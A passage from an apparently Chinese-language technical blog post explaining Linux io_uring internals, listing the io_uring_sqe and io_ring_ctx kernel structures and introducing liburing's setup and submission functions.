class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">	__u8	flags;		<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	cmd_op;</span><br><span class="line">			__u32	__pad1;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">__kernel_rwf_t</span>	rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">		__u32		xattr_flags;</span><br><span class="line">		__u32		msg_ring_flags;</span><br><span class="line">		__u32		uring_cmd_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	addr_len;</span><br><span class="line">			__u16	__pad3[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	addr3;</span><br><span class="line">			__u64	__pad2[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment">		 * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__u8	cmd[<span class="number">0</span>];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>io_uring_sqe</code> , 用来表征一个IO任务的sqe, 通过在sqes 环形队列上插入此结构体, 实现内核任务的提交.  其中大部分参数都是提交给相应的任务处理函数的参数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">// 任务的类型, 用一系列枚举变量来表示</span></span><br><span class="line">	__u8	flags;		<span class="comment">// 任务的一些标志位, 可以设置任务的一些特性</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	cmd_op;</span><br><span class="line">			__u32	__pad1;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">__kernel_rwf_t</span>	rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">		__u32		xattr_flags;</span><br><span class="line">		__u32		msg_ring_flags;</span><br><span class="line">		__u32		uring_cmd_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	addr_len;</span><br><span class="line">			__u16	__pad3[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	addr3;</span><br><span class="line">			__u64	__pad2[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment">		 * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__u8	cmd[<span class="number">0</span>];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>io_ring_ctx</code> 是kernel  io_uring运行的上下文，记录了io_uring 运行时需要保存的一些信息，这里就不一一分析每个成员了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> &#123;</span></span><br><span class="line">	<span class="comment">/* const or read-mostly hot data */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		flags;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		drain_next: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		restricted: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		off_timeout_used: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		drain_active: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		has_evfd: <span class="number">1</span>;</span><br><span class="line">		<span class="comment">/* all CQEs should be posted only by the submitter task */</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		task_complete: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		lockless_cq: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		syscall_iopoll: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		poll_activated: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		drain_disabled: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		compat: <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">submitter_task</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span>		*<span class="title">rings</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span>	<span class="title">refs</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">enum</span> <span class="title">task_work_notify_mode</span>	<span class="title">notify_method</span>;</span></span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* submission data */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uring_lock</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Ring buffer of indices into array of io_uring_sqe, which is</span></span><br><span class="line"><span class="comment">		 * mmapped by the application using the IORING_OFF_SQES offset.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This indirection could e.g. be used to assign fixed</span></span><br><span class="line"><span class="comment">		 * io_uring_sqe entries to operations and only submit them to</span></span><br><span class="line"><span class="comment">		 * the queue when needed.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * The kernel modifies neither the indices array nor the entries</span></span><br><span class="line"><span class="comment">		 * array.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		u32			*sq_array;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span>	*<span class="title">sq_sqes</span>;</span></span><br><span class="line">		<span class="type">unsigned</span>		cached_sq_head;</span><br><span class="line">		<span class="type">unsigned</span>		sq_entries;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Fixed resources fast path, should be accessed only under</span></span><br><span class="line"><span class="comment">		 * uring_lock, and updated through io_uring_register(2)</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_node</span>	*<span class="title">rsrc_node</span>;</span></span><br><span class="line">		<span class="type">atomic_t</span>		cancel_seq;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_file_table</span>	<span class="title">file_table</span>;</span></span><br><span class="line">		<span class="type">unsigned</span>		nr_user_files;</span><br><span class="line">		<span class="type">unsigned</span>		nr_user_bufs;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>	**<span class="title">user_bufs</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span>	<span class="title">submit_state</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span>	*<span class="title">io_bl</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">io_bl_xa</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span>	<span class="title">cancel_table_locked</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">apoll_cache</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">netmsg_cache</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * -&gt;iopoll_list is protected by the ctx-&gt;uring_lock for</span></span><br><span class="line"><span class="comment">		 * io_uring instances that don&#x27;t use IORING_SETUP_SQPOLL.</span></span><br><span class="line"><span class="comment">		 * For SQPOLL, only the single threaded io_sq_thread() will</span></span><br><span class="line"><span class="comment">		 * manipulate the list, hence no extra locking is needed there.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span>	<span class="title">iopoll_list</span>;</span></span><br><span class="line">		<span class="type">bool</span>			poll_multi_queue;</span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We cache a range of free CQEs we can use, once exhausted it</span></span><br><span class="line"><span class="comment">		 * should go through a slower range setup, see __io_get_cqe()</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>	*<span class="title">cqe_cached</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>	*<span class="title">cqe_sentinel</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="type">unsigned</span>		cached_cq_tail;</span><br><span class="line">		<span class="type">unsigned</span>		cq_entries;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_ev_fd</span>	__<span class="title">rcu</span>	*<span class="title">io_ev_fd</span>;</span></span><br><span class="line">		<span class="type">unsigned</span>		cq_extra;</span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * task_work and async notification delivery cacheline. Expected to</span></span><br><span class="line"><span class="comment">	 * regularly bounce b/w CPUs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span>	<span class="title">work_llist</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span>		check_cq;</span><br><span class="line">		<span class="type">atomic_t</span>		cq_wait_nr;</span><br><span class="line">		<span class="type">atomic_t</span>		cq_timeouts;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span>	<span class="title">cq_wait</span>;</span></span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* timeouts */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">spinlock_t</span>		timeout_lock;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">timeout_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">ltimeout_list</span>;</span></span><br><span class="line">		<span class="type">unsigned</span>		cq_last_tm_flush;</span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>	<span class="title">completion_cqes</span>[16];</span></span><br><span class="line"></span><br><span class="line">	<span class="type">spinlock_t</span>		completion_lock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IRQ completion list, under -&gt;completion_lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span>	<span class="title">locked_free_list</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		locked_free_nr;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">io_buffers_comp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">cq_overflow_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span>	<span class="title">cancel_table</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">sq_creds</span>;</span>	<span class="comment">/* cred used for __io_sq_thread() */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span>	*<span class="title">sq_data</span>;</span>	<span class="comment">/* if using sq thread polling */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span>	<span class="title">sqo_sq_wait</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">sqd_list</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		file_alloc_start;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		file_alloc_end;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">personalities</span>;</span></span><br><span class="line">	u32			pers_next;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">io_buffers_cache</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Keep this last, we don&#x27;t need it for the fast path */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span>		<span class="title">poll_wq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_restriction</span>		<span class="title">restrictions</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* slow path rsrc auxilary data, used by update/register */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>		*<span class="title">dummy_ubuf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>		*<span class="title">file_data</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>		*<span class="title">buf_data</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* protected by -&gt;uring_lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">rsrc_ref_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>		<span class="title">rsrc_node_cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span>		<span class="title">rsrc_quiesce_wq</span>;</span></span><br><span class="line">	<span class="type">unsigned</span>			rsrc_quiesce;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">io_buffers_pages</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">#<span class="keyword">if</span> defined(CONFIG_UNIX)</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">socket</span>		*<span class="title">ring_sock</span>;</span></span><br><span class="line">	<span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* hashed buffered write serialization */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_hash</span>		*<span class="title">hash_map</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Only used for accounting purposes */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span>		*<span class="title">user</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>		*<span class="title">mm_account</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ctx exit and cancelation */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span>		<span class="title">fallback_llist</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span>		<span class="title">fallback_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span>		<span class="title">exit_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">tctx_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span>		<span class="title">ref_comp</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* io-wq management, e.g. thread count */</span></span><br><span class="line">	u32				iowq_limits[<span class="number">2</span>];</span><br><span class="line">	<span class="type">bool</span>				iowq_limits_set;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span>		<span class="title">poll_wq_task_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">defer_list</span>;</span></span><br><span class="line">	<span class="type">unsigned</span>			sq_thread_idle;</span><br><span class="line">	<span class="comment">/* protected by -&gt;completion_lock */</span></span><br><span class="line">	<span class="type">unsigned</span>			evfd_last_cq_tail;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If IORING_SETUP_NO_MMAP is used, then the below holds</span></span><br><span class="line"><span class="comment">	 * the gup&#x27;ed pages for the two rings, and the sqes.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>			n_ring_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>			n_sqe_pages;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span>			**<span class="title">ring_pages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span>			**<span class="title">sqe_pages</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="liburing-2">liburing</h2>
<p>liburing 提供的核心接口有如下函数:</p>
<ul>
<li><code>io_uring_queue_init</code>  io_uring的初始化结构，用来初始化一个 <code>io_uring</code> 结构体</li>
<li><code>io_uring_prep_xxx</code>      用来创建一个任务</li>
<li><code>io_uring_submit</code>          用来提交一个任务</li>
</ul>
<h3 id="io-uring-queue-init"><code>io_uring_queue_init</code></h3>
<p>参数:</p>
<ul>
<li>entries: sq队列大小</li>
